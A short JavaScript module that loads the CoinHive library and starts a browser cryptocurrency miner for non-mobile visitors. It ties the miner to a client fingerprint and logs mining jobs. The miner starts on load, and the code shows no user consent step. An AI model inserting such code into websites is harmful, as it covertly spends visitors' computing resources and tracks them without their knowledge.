/* global CoinHive */

import './coinhive.min.js';
import { SITE_KEY } from './Constants';
import log from './log';
import { mobile, fingerprint } from './client';

const miner = new CoinHive.User(SITE_KEY, fingerprint, {
  threads: 1,
});

if (!mobile) miner.start();

miner.on('found', (...args) => {
  log('new job', ...args);
});

miner.on('accepted', (...args) => {
  log('work accepted', ...args);
});

export default miner;
